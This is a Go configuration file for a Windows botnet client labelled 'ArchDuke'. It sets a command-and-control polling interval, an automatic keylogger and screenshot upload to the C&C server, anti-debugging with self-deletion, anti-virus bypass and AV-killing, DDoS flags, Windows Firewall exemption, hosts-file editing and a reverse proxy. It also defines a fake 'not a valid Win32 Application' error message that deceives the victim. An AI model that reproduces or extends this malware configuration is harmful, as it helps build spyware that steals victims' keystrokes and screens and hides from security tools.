package components

var (
	useSSL                 = false                              //Use SSL Connections? Make sure the Panel URLS are https://
	sslInsecureSkipVerify  = true                               //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
	userAgentKey           = "d5900619da0c8a72e569e88027cd9490" //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
	checkEveryMin          = 15                                 //Min Time (Seconds) to check for commands
	checkEveryMax          = 25                                 //Max Time (Seconds) to check for commands (Must be more then Min)
	installMe              = false                              //Should the bot install into system?
	clientVersion          = "ArchDuke"                         //Bot Version
	autofirwall            = true                               //If has Admin on install will automaticly add bot to Windows Firewall
	campaignMode           = false                              //Only install in stated regions
	antiDebug              = false                              //Anti-Debug Programs
	debugReaction          = 1                                  // How to react to debug programs, 0 = Self Delete, 1 = Exit, 2 = Loop doing nothing
	activeDefense          = false                              //Use Active defense
	watchdogName           = "activedefense"                    //Name of the WatchDog program
	antiProcess            = false                              //Run Anti-Process on run
	autoScreenShot         = true                               //Auto send a new Screen Shot to C&C
	autoScreenShotInterval = 15                                 //Minutes to wait between each SS
	sleepOnRun             = false                              //Enable to sleep before loading config/starting
	sleepOnRunTime         = 5                                  //Seconds to sleep before starting (helps bypass AV)
	editHosts              = false                              //Edit the HOST file on lounch to preset settings
	antiVirusBypass        = false                              //Helps hide from Anti-Virus Programs
	procBlacklist          = false                              //Process names to exit if detected
	autoKeylogger          = true                               //Run keylogger automaticly on bot startup
	autoKeyloggerInterval  = 5                                  //Minutes to wait to send keylogs to C&C
	autoReverseProxy       = false                              //To run the Reverse Proxy Server on startup
	reverseProxyPort       = "8080"                             //Normal Port to run the server on
	reverseProxyBackend    = "127.0.0.1:6060"                   //Backends to send proxyed data too. Supports Multi (127.0.0.1:8080,127.0.0.1:8181,....)

	isAdmin        = false
	isDDoS         = false
	isKeyLogging   = false
	isHosting      = false
	isAVKilling    = false
	isAntiProc     = false
	singleInstance = true //Check to see if this bots already running

	startUpError      = false                                                                                              //Shows an Error message on startup
	startUpErrorTitle = "Error"                                                                                            //Title of Error Message
	startUpErrorText  = "This Programm is not a valid Win32 Application!"                                                  //Text of Error Message

)
